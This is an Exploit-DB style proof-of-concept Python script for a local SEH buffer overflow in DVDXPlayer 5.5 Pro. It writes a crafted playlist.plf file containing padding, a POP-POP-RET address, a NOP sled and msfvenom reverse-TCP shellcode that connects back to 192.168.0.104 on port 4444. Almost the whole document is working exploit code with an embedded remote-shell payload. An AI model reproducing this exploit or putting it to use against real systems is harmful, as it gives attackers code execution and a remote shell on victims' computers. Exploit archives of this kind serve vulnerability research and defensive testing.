# Exploit Title: DVDXPlayer 5.5 Pro Local Buffer Overflow with SEH
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.dvd-x-player.com/download.html#dvdPlayer
# Software Link: https://www.exploit-db.com/apps/f02234bb10ee2657aacdd5ac9b38c134-DVDXPlayerSetup.exe
# Version: 5.5 Pro
# Tested on: Windows XP SP2

import os
import sys

badchars = "\x00\x0a\x0d\x1a"

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -b '\x00\x0a\x0d\x1a' -f python
buf =  ""
buf += "\xdd\xc6\xd9\x74\x24\xf4\xb8\x9d\x26\x3a\xe4\x5e\x29"
buf += "\xc9\xb1\x52\x31\x46\x17\x83\xc6\x04\x03\xdb\x35\xd8"
buf += "\x11\x1f\xd1\x9e\xda\xdf\x22\xff\x53\x3a\x13\x3f\x07"
buf += "\x4f\x04\x8f\x43\x1d\xa9\x64\x01\xb5\x3a\x08\x8e\xba"
buf += "\x8b\xa7\xe8\xf5\x0c\x9b\xc9\x94\x8e\xe6\x1d\x76\xae"
buf += "\x28\x50\x77\xf7\x55\x99\x25\xa0\x12\x0c\xd9\xc5\x6f"
buf += "\x8d\x52\x95\x7e\x95\x87\x6e\x80\xb4\x16\xe4\xdb\x16"
buf += "\x99\x29\x50\x1f\x81\x2e\x5d\xe9\x3a\x84\x29\xe8\xea"
buf += "\xd4\xd2\x47\xd3\xd8\x20\x99\x14\xde\xda\xec\x6c\x1c"
buf += "\x66\xf7\xab\x5e\xbc\x72\x2f\xf8\x37\x24\x8b\xf8\x94"
buf += "\xb3\x58\xf6\x51\xb7\x06\x1b\x67\x14\x3d\x27\xec\x9b"
buf += "\x91\xa1\xb6\xbf\x35\xe9\x6d\xa1\x6c\x57\xc3\xde\x6e"
buf += "\x38\xbc\x7a\xe5\xd5\xa9\xf6\xa4\xb1\x1e\x3b\x56\x42"
buf += "\x09\x4c\x25\x70\x96\xe6\xa1\x38\x5f\x21\x36\x3e\x4a"
buf += "\x95\xa8\xc1\x75\xe6\xe1\x05\x21\xb6\x99\xac\x4a\x5d"
buf += "\x59\x50\x9f\xf2\x09\xfe\x70\xb3\xf9\xbe\x20\x5b\x13"
buf += "\x31\x1e\x7b\x1c\x9b\x37\x16\xe7\x4c\xf8\x4f\xe7\xe4"
buf += "\x90\x8d\xe7\xe5\x3c\x1b\x01\x6f\xad\x4d\x9a\x18\x54"
buf += "\xd4\x50\xb8\x99\xc2\x1d\xfa\x12\xe1\xe2\xb5\xd2\x8c"
buf += "\xf0\x22\x13\xdb\xaa\xe5\x2c\xf1\xc2\x6a\xbe\x9e\x12"
buf += "\xe4\xa3\x08\x45\xa1\x12\x41\x03\x5f\x0c\xfb\x31\xa2"
buf += "\xc8\xc4\xf1\x79\x29\xca\xf8\x0c\x15\xe8\xea\xc8\x96"
buf += "\xb4\x5e\x85\xc0\x62\x08\x63\xbb\xc4\xe2\x3d\x10\x8f"
buf += "\x62\xbb\x5a\x10\xf4\xc4\xb6\xe6\x18\x74\x6f\xbf\x27"
buf += "\xb9\xe7\x37\x50\xa7\x97\xb8\x8b\x63\xa7\xf2\x91\xc2"
buf += "\x20\x5b\x40\x57\x2d\x5c\xbf\x94\x48\xdf\x35\x65\xaf"
buf += "\xff\x3c\x60\xeb\x47\xad\x18\x64\x22\xd1\x8f\x85\x67"

#0x61602adb POP-POP-RET
buffer = "A" * 608 + "\xeb\x06\x90\x90" + "\xdb\x2a\x60\x61" +  "\x90" * 16 + buf

try:
	file = open("playlist.plf","w")
	file.write(buffer)
	file.close()
	print "[+] File created successfully"

except:
	print "[X] Error creating file!"
	sys.exit(0)
            
